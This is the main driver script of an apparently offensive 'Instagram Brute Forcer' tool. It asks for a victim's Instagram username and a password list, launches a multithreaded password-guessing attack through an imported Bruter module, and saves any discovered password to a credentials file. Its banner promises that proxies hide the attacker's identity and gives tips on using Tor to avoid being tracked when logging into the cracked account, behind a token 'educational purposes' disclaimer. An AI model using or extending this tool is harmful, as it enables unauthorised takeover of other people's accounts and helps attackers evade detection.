from sys import exit
from os.path import exists
from lib.bruter import Bruter
from lib.display import Display
from platform import python_version
from lib.const import credentials, modes
from argparse import ArgumentParser, ArgumentTypeError
from colorama import Fore


class Engine(object):

    def __init__(self, username, threads, passlist_path, is_color):
        self.bruter = None
        self.resume = False
        self.is_alive = True
        self.threads = threads
        self.username = username
        self.passlist_path = passlist_path
        self.display = Display(is_color=is_color)

    def passlist_path_exists(self):
        if not exists(self.passlist_path):
            self.display.warning("Invalid path to password list or File Doesn't exist")
            return False
        return True

    def create_bruter(self):
        self.bruter = Bruter(
            self.username,
            self.threads,
            self.passlist_path
        )

    def get_user_resp(self):
        return self.display.prompt('Would you like to resume the attack? [y/n]: ')

    def write_to_file(self, password):
        with open(credentials, 'at') as f:
            data = 'Username: {}\nPassword: {}\n\n'.format(
                self.username.title(), password)
            f.write(data)

    def start(self):
        if not self.passlist_path_exists():
            self.is_alive = False

        if self.is_alive:
            self.create_bruter()

            while self.is_alive and not self.bruter.password_manager.session:
                pass

            if not self.is_alive:
                return

            if self.bruter.password_manager.session.exists:
                try:
                    resp = self.get_user_resp()
                except:
                    self.is_alive = False

                if resp and self.is_alive:
                    if resp.strip().lower() == 'y':
                        self.bruter.password_manager.resume = True

            try:
                self.bruter.start()
            except KeyboardInterrupt:
                self.bruter.stop()
                self.bruter.display.shutdown(self.bruter.last_password,
                                             self.bruter.password_manager.attempts, len(self.bruter.browsers))
            finally:
                self.stop()

    def stop(self):
        if self.is_alive:

            self.bruter.stop()
            self.is_alive = False

            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
                self.bruter.display.stats_not_found(self.bruter.last_password,
                                                    self.bruter.password_manager.attempts, len(self.bruter.browsers))

            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(self.bruter.password,
                                                self.bruter.password_manager.attempts, len(self.bruter.browsers))


def valid_int(n):
    if not n.isdigit():
        raise ArgumentTypeError('viruses must be a number')

    n = int(n)

    if n > 3:
        raise ArgumentTypeError('maximum  viruses is 3')

    if n < 0:
        raise ArgumentTypeError('minimum viruses  is 0')

    return n


def args():
    args = ArgumentParser()
    args.add_argument('-nc', '--no-color', dest='color',
                      action='store_true', help='disable colors')
    args.add_argument('-v', '--viruses', default=2, type=valid_int,
                      help='viruses: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots')
    return args.parse_args()


if __name__ == '__main__':

    if int(python_version()[0]) < 3:
        print('[!] Please use Python version of more than 3')
        exit()

    argument = args()
    print(Fore.YELLOW +  "      ______    _____    _____     ____   _____   _____          ")
    print(               "     |  ____|  /     \  |  _  |   / ___| | ____| |  _  |          ")
    print(               "     |  |__   ||  _  || |    _|  | |     | |___  |    _|          " )
    print(               " ||> |  ___|  || |_| || | |\ \   | |     | ____| | |\ \  <||        " + Fore.RESET + Fore.RED)
    print(               "     |  |     ||     || | | \ \  | |___  | |___  | | \ \             ")
    print(               "     |__|      \_____/  |_|  \_\  \____| |_____| |_|  \_\            " + Fore.GREEN)
    print(               "\n Instagram Brute Forcer v1.0.0 Author : Sparrow005 & MrUnstoppable "    + Fore.RESET)
    print("\n")
    print("[" + Fore.RED + "!" + Fore.RESET + "]" + Fore.RED + " Warning : This tool is truly for Educational Purposes and Developers assume no liability for any Misuse of this Software and Make sure You use it is for a Right Cause" + Fore.RESET )
    print("\n[" + Fore.RED + "*" + Fore.WHITE + "]" + Fore.RED + " Usage and Advantage :\n\tThe tool may take a lot of time Because of Multiple attempts for a Single password . There is no fear for Tracking as there are proxies added to this tool which change your ip thus changing your location to another country,another address to which you'll get pissed off and You can securely perform actions without Revealing your Identity which is 100% safe and you can trust this tool in it...\nGood Luck for Success\n\n"+ Fore.WHITE + "[" + Fore.RED + "*" + Fore.WHITE + "]" + Fore.RED + " Caution:\n\tBe Careful during login of the account with the Discovered password in which you can be slipped and tracked by the Facebook.For this case, Just use DuckDuckGo Privacy Browser in case of mobile and TOR Browser for PC\n" + Fore.RESET)  
     
    username = input( "\x1b[3m" + Fore.CYAN + "\x1b[1m" + "Please Enter the Instagram Username:\n" + Fore.WHITE + "=" + Fore.YELLOW + ">\t")
    print("\n")
    default_passlist_path = 'pass.txt'
    passlist_path = input("\x1b[1m"+ Fore.CYAN + "Please Enter the path to Password list [Enter for Default]:\n" + Fore.WHITE + "=" + Fore.YELLOW + ">\t") or default_passlist_path
    print(Fore.RESET)
    viruses = argument.viruses
    is_color = True if not argument.color else False
    Engine(username, modes[viruses], passlist_path, is_color).start()
